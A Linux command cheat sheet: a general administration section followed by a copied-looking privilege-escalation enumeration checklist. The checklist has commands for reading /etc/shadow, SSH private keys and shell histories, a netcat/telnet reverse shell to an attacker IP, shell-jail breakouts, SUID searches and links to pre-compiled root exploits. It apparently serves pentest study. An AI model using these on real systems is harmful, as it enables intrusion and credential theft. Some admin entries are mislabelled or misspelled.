--- ---
<h2>General Commands</h2>

- General (Most Used - Recursive)
```Terminal
- cd                                  ---> Move directory or go home directory if alone
- /..                                 ---> Come back from one direcotry
- ls -la                              ---> List element (Info)
- ls -lh                              ---> List element (Give more information - hidden)
- ls -a                               ---> List recursive (All - Including hidden)
- ls -n                               ---> List folders (UID in number)
- ls -R or ls -aR                     ---> List recursive folder (-a will show hidden too)
- cat                                 ---> Print document
- less                                ---> Scoll trough documents (Like cat)
- ./                                  ---> Execute document
- apt list m* (ex)                    ---> List all packages starting with m
- apt search echo (ex)                ---> Search for echo in apt reprository
- |                                   ---> procede to the second command before output
- ;                                   ---> Add a second command in the output
```

- Searching
```Terminal
# General
- pwd                                ---> Print current directory

# AWK (Like grep but more advance)
- awk '{print $1, $4}' TEST.txt      ---> Retrieve parameter Num 1 & 4 of each lines
- awk '$4 > 30000' TEST.txt          ---> Retrieve parameter greater then 30K each lines
- awk 'BEGIN {OFS=":"} {print $1, $4}' TEST.txt ---> Retrieve & print Num 1 & 4 separated by ":"

# Grep (GREP IS CASE SENSITIVE)
- grep "Text"                        ---> Check Text (-i=Allcases, -r=All folder file)
- grep -i "ReD"                      ---> Case insensive (Any lower/upper will match)
- grep "ap[pe]"                      ---> Match "app" or "ape" (give options or matching)
- grep -r "SOMETHING" /Path/file     ---> Check All something in a folder 
- cat x.txt | grep -e "X|Y"          ---> Grep regular expression search for X & Y
- cat x.txt | grep -e "^1[0-2]"      ---> Search lines that start with 1 followed by 0-2
- cat x.txt | grep -e "Day$"         ---> End with Day ($ = end / ^ = start of line)
- cat x.txt | grep -e "D.y"          ---> Find Any caraters between two letters (.)

- locate                             ---> Find the file location

- which                              ---> Find the file location (BEST)

- find ~/ -perm +rwx
- find ~/ (Current directory) -name filename      ---> Find the file location
- find ~/ (Current directory) -name "*.txt"       ---> Find all .TXT file in directory location
- find / (All directory) -name "*.txt" 2>/dev/nul ---> Find all .TXT file in directory location
```

- Process / System / Alias / Environement Variable
```
# Process
- ps -ef                             ---> List process ongoing
- top                                ---> Show task management
- system monitor (GUI)               ---> Show task management
- PID = Process ID

- free -h                            ---> Show available memories (+Buff/cache)

- sudo kill (PID)
- sudo kill -9 (PID)                 ---> Kill gently
- sudo kill -15 (PID)                ---> Kill if not responding
- sudo killall google                ---> Will kill all process contening google

- ctr-z                              ---> Background task
- fg                                 ---> Take back the background task


# System
- uname -r or -a                     ---> kernel version

- isb_release -a                     ---> Server version

- systemctl {ACTION} {PROCESSE}
   - Start
   - Stop
   - Enable
   - Disable

# Environement Variable
- Wich COMMAND                       ---> Show where the command is stored
- env                                ---> Show all environement variable for bash
- X=Something                        ---> Create environement var (echo $X = Some...)
- export X=Y                         ---> Let you export env var (Remind it to terminal)

# Alias
- alias NAME='PATH/ACTION'     ---> Create Alias
- unalias your_alias_name      ---> Remove Alias
- sudo nano ~/.bashrc          ---> Permanent Alias (Edit the file & add the alias)

# ???
- echo "export PATH=$PATH:~/go/bin" >> ~/.bashrc
```

- Popular Files
```
- dmesg                ---> Show kernel logs
- journalctl -u cron   ---> Show logs of the cron jobs runned on the device

- /boot                ---> Kernel files
- /etc                 ---> Configuration files
- /var/log             ---> Log files

- usr/local/bin        ---> Locally compiled programs
- usr/local/etc        ---> Locally compiled programs

- /bin                 ---> Needed for system rescue
- /usr/bin             ---> Location of most programs
- /sbin /usr/sbin      ---> System config tools
- /usr/share/bin       ---> Program other then apps, example: stuff appache migh use

- /proc                ---> Folder that contain the process that can be found in the command ps
- /sys                 ---> Other kernel stuff (proc can contain kernel stuff)
- /dev                 ---> Device nodes, provide an interface through which software can interact with hardware devices. Ex: dev/sda = SATA hard drive, dev/ttyS0 = first serial port...
```

- Files / File system / Partitions
```
# View file
- cat file.txt                       ---> output the text
- head -n 5 file.txt                 ---> output the first 5 lines of the document
- tail -n 5 file.txt                 ---> output the last 5 lines of the document
- tail -n +2 file.txt                ---> Output everything after the second line

# Removing file
- rm file.txt                        ---> Removing a file
- rmdir folder                       ---> Removing an empty directory
- rm -r ANYTHING                     ---> Removing anything without error

# Destroy/Delete Files
shred FILE     ---> Destoy redability of a file

# Copying files
- cp filename /LOCATION/NEWFILENAME  ---> Copying files
- cp filename NEWFILENAME            ---> Renaming a file

# Moving files
- mv

# Creating File
- mkdir                              ---> Create a folder
- touch                              ---> Create a document
- anew                               ---> Create anew document with output
- echo                               ---> Echo text

- >                                  ---> Create output
- 2>                                 ---> Output error to somewhere you want
- 2>&1                               ---> Output everything (errors & else) somewhere
- >>                                 ---> Append text to a file
- &                                  ---> Run command in background
- &&                                 ---> Combine commands

# Partitions and volumes
- sudo fdisk -l /dev/sdb             ---> Show partitions
- sudo fdisk /dev/sdb                ---> MBR (m)=help (n)=create (d)=delete (p)=print
- sudo gdisk /dev/sdc                ---> GPT (m)=help (n)=create (d)=delete (p)=print
- sudo parted /dev/sdb               ---> ???

# Mounting Volumes and Files system
- lsblk -f                           ---> Show available mounting files system
- sudo mount /dev/sdb1 /mnt/FOLDER   ---> Mount sdb1 to mtn/FOLDER
- sudo mount -t ext4 /dev/sdb1 /mnt/FOLDER ---> Specify the format (not obligated)
- sudoedit /etc/fstab                ---> Add entry to mount after every bootup
	- /dev/sdb1 /mnt/FOLDER FILEFORMAT defaults 0 0
	- UUID=THE_UUID /mnt/FOLDER FILEFORMAT defaults 0 0 ---> Use UUID to mount volume
- sudo mount -a                      ---> Launch automaticly the fstab files
- sudo umount /dev/sdb1              ---> Unmount the partition

# LVM (Logical Volume Manager) - Using RAID 0,1,5 / Create virtual volume
- sudo pycreate /dev/VOLUME1 /dev/VOLUME2  ---> Making them part of LVM
- sudo vgcreate vg1 /dev/sdb1 /dev/sdc1    ---> Merge Volumes in a group (named vg1)
- sudo pvdisplay                           ---> ???
- sudo vgdisplay                           ---> Show volume groups
- sudo lvcreate -L 12G vg1 -n Virtvolume   ---> Create virtual volume (12G named Virt..)
- sudo lvresize -L +5G /dev/vgi/Virtvolume ---> Extend virtual volume size
- sudo resize2fs /dev/vgi/Virtvolume       ---> Extend volume (ext4) NEED DO THIS AFTER
- sudo lvremove /dev/vg1/Virtvolume        ---> Remove volume space (ext4) NEED DO ...
- sudo vgremove /dev/vg1                   ---> Remove volume space (ext4) NEED DO ...
- sudo pvremove /dev/sdb1 /dev/sdc1 /dev/vg1---> Remove volume space (ext4) NEED DO ...
```

- Network
```
- nslookup DOMAIN                    ---> Check DNS record (MX, CNAME, ...)
- ip a                              ---> Easiest and fastest way to get IP info
- netstat -tuna                      ---> Show ports and status (Open/Close)
- ss -tuna                           ---> Show ports and status (Open/Close) - SAME
- ifconfig                           ---> Information IP

- cat /etc/hosts                     ---> Show DNS from the machine (IP linked to Nameserver)
- cat /etc/resolv.conf               ---> Show where we will querry the DNS IP

- wget -O - -q https://checkip.amazonaws.com   ---> Find your IP address in terminal
```

- User Management / Permissions / Groups / Password
```
- whoami                             ---> Print User
- id                                 ---> Print id, group, ... of current user
- id USER                            ---> Show id, group, ... of selected user
- last                               ---> Show the last loggin in the current system
- who                                ---> Check who is currently loggin in the system
- w                                  ---> Show what current logged user are doing

- sudo cat /etc/passwd               ---> Show user information (groups, UID, Shell, ...)
- sudo cat /etc/shadow               ---> Show user password
- sudo cat /etc/gshadow              ---> Show group password
- sudo cat /etc/group                ---> Show user associated with groups

# Create Users
- sudo useradd -d /home/USERNAME -m -G sudo,adm USERNAME ---> Create user, create directory, -m = create home, -G = add to the suplementary groups sudo & adm
- sudo userdel -rf USERNAME          ---> Delete user & all its directory (f=force, r=remove)
- sudo /etc/skel FILEX.XYZ            ---> Create file here will give file to every new users

- su USER                            ---> Switch User
- sudo passwd USER                   ---> Set password for a new user
- sudo chage -l USER                 ---> Show password age for the user (man chage --> More info)
- sudo chage -M 1 USER               ---> USER change passwd next 24H (Change -M 1 to X after)
- sudoedit /etc/login.defs           ---> Set password policies for all users (easier management)
- sudoedit /etc/security faillock.conf ---> Login faillure and lockout policies

# Create Groups
- sudo groupadd NAME                 ---> Create a group
- less etc/group                     ---> Show all groups created
- sudo usermod -aG USERNAME        ---> Add group to user (-a=append / not remove other groups)
- sudo groupmod -n NEWNAME OLDNAME   ---> Change group name

- ls -l                              ---> Files/permissions (First=User,S=Group,T=Other)
- drwxr-xr-x (Example)               ---> d=directory / User=read,write,execute / ...
- 4=Read 2=Write 1= Execute          ---> Permission set via number ex: 7=All perms
- chmod 740 file.txt (Example)       ---> User=All perms / Group=Read / Other=No perms
- chmod +r file.txt                  ---> User=read and groups & other nothing
- chmod -r file.txt                  ---> Remove read access to current user
- chmod u=rwx,g=rw,o=r file.txt      ---> Set permissions via letters
- chmod g-w file.txt (Example)       ---> Remove write to groupe
- less ~/.profile                    ---> Chamge default permission given on new file
	- #umask 022                     ---> U=0->ALL perms, G=2->R&E (7 - number (WEIRD))

# Sudo Permission
- ls -n                              ---> Enable you to see the user id and group id of a file
- sudo visudo                        ---> Add sudo permissions to users (Commands used -> sudo)
- sudo su -                          ---> Root shell with user password



#  Standard Linux permissions typically restrict file access beyond the first user listed. To grant access to additional users, you'd usually create a new group, add users to it, and assign file permissions accordingly. Handling access for multiple groups can be cumbersome, but there's a simpler solution.

- getfacl FILE.txt                   ---> Show permission for this file
- setfacl -m u:USER:rw FILE.txt      ---> Add User to the permission with rw 
- setfacl -x u:USER:rw FILE.txt      ---> Remove User to the permission with rW
- setfacl -m g:GROUP:rw FILE.txt     ---> Add Group to the permission with rw 
```

- Binary (Compilling)
```
- Download the File
- tar -xvzf file.tar.gz     ---> Decompile the file
- cd file/src               ---> Go in the file where you have all the Makefile/C code/References
- make                      ---> Give you options of compiling depending of your system
- make clean OPTION         ---> Will compile the file in the run folder
- sudo gpasswd -a USER GROUP ---> Add USER to Group
- sudo gpasswd -d USER GROUP ---> Remove USER from Group
- sudo gpasswd -a USER GROUP | sudo gpasswd -A USER GROUP ---> Make a user admin of it's group (give him edit permission inside the group)

- id                        ---> Show the ID of the user (only first group set permitions)
- newgrp GROUP              ---> Will set the following action from this group
- groups                    ---> Show all the groups of the current user
- groups USER_X             ---> Show all groups for USER_X
```

- History & Record Commands
```
# History
history                     ---> Show History of commands
history clear               ---> Clear History of commands

# Register Command
command | tee >> FILE.TXT
```

- Others
```Terminal
# Docker.io (Containers)
- sudo dockerd                      ---> Start docker
- sudo usermod -aG docker USERNAME  ---> Ading user to docker group, enable user to run docker stuff without beeing root (-a = Primary group | -G = Secondary group) - REBOOT
- docker ps                         ---> Show the docker process
- docker ps -a                      ---> Show all the docker process (Show history)
- docker images                     ---> Show a list of all the docker installed
- docker search ubuntu (EX)         ---> Search for docker images
- docker pull NAMEOFIMAGE           ---> Download the image to the computer
- https://hub.docker.com/           ---> Docker images (Best way to start)
- docker run helloworld             ---> Download and run helloworld

# Create shortcut (reference)
ln -s NAMEOFSHORTCUT /somewhere/DESTINATIONSHORTCUT  ---> Create shortcut (reference)

# Combine files together
- cat file1.txt file2.txt file3.txt > combined_list.txt

# Sort and remove duplicate
- sort combined_list.txt | uniq -u > cleaned_combined_list.txt

# Archive and Zipping
- tar -czf Newfile.tgz *             ---> Archive & zip in current folder (* = All)
- tar -xzf file.tgz                  ---> Unzip tar file
```

---

<h2> Exploitation Commands</h2>

#### Operating System

- What's the distribution type? What version?
```Terminal
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

- What's the Kernel version? (32,64,86-bit)
```Terminal
cat /proc/version   
uname -a
uname -mrs 
rpm -q kernel 
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

- What can be learnt from the environmental variables?
```Terminal
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

- Is there a printer?
```Terminal
lpstat -a
```

---

#### Applications & Service

- What services are running? Which service has which user privilege?
```Terminal
ps aux
ps -ef
top
cat /etc/service 
```

- Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
```Terminal
ps aux | grep root
ps -ef | grep root
```

- What applications are installed? What version are they? Are they currently running?
```Terminal
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/ 
```

- Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
```Terminal
cat /etc/syslog.conf 
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf 
cat /etc/inetd.conf 
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ 
```

- What jobs are scheduled?
```Terminal
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

- Any plain text usernames and/or passwords?
```Terminal
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 
```

---

#### Communications & Networking

- What NIC(s) does the system have? Is it connected to another network?
```Terminal
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network 
```

- What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
```Terminal
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

- What other users & hosts are communicating with the system?
```Terminal
lsof -i 
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

- Whats cached? IP and/or MAC addresses
```Terminal
arp -e
route
/sbin/route -nee
```

- Is packet sniffing possible? What can be seen? Listen to live traffic
```Terminal
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
```

- Have you got a shell? Can you interact with the system?
```Termminal
# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
```

- Is port forwarding possible? Redirect and interact with traffic from another view
```Termminal
# rinetd
# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch

# fpipe
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

`# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe`
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
```

- Is tunnelling possible? Send commands locally, remotely
```Termminal
ssh -D 127.0.0.1:9050 -N [username]@[ip] 
proxychains ifconfig
```

---

#### Confidential Information & Users

- Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
```Termminal
id
who
w
last 
cat /etc/passwd | cut -d:    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l 
```

- What sensitive files can be found? 
```Termminal
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

- Anything "interesting" in the home directorie(s)? If it's possible to access
```Termminal
ls -ahlR /root/
ls -ahlR /home/
```

- Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
```Termminal
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```

- What has the user being doing? Is there any password in plain text? What have they been edting?
```Terminal
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history
```

- What user information can be found? 
```Termminal
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

- Can private-key information be found? 
```Termminal
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

---

#### File Systems

- Which configuration files can be written in /etc/? Able to reconfigure a service?
```Termminal
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
```

- What can be found in /var/ ? 
```Termminal
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd 
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

- Any settings/files (hidden) on website? Any settings file with database information?
```Termminal
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/
```

- Is there anything in the log file(s) (Could help with "Local File Includes"!)
```Termminal
# http://www.thegeekstuff.com/2011/08/linux-var-log-files/

cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
`#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp`
```

- If commands are limited, you break out of the "jail" shell?
```Termminal
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

- How are file-systems mounted? 
```Termminal
mount
df -h
```

- Are there any unmounted file-systems?
```Termminal
cat /etc/fstab
```

- What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
```Termminal
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

``# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)`
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
```

- Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
```Termminal
find / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null    # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
```

- Any "problem" files? Word-writeable, "nobody" files
```Termminal
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
```
---

#### Preparation & Finding Exploit Code

- What development tools/languages are installed/supported?
```Termminal
find / -name perl*
find / -name python*
find / -name gcc* 
find / -name cc
```

- How can files be uploaded?
```Termminal
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp* 
find / -name ftp 
```


- Finding exploit code
http://www.exploit-db.com
http://1337day.com
http://www.securiteam.com
http://www.securityfocus.com
http://www.exploitsearch.net
http://metasploit.com/modules/
http://securityreason.com
http://seclists.org/fulldisclosure/
http://www.google.com 


- Finding more information regarding the exploit 
http://www.cvedetails.com
http://packetstormsecurity.org/files/cve/[CVE]
http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
http://www.vulnview.com/cve-details.php?cvename=[CVE]


- (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
http://tarantula.by.ru/localroot/
http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/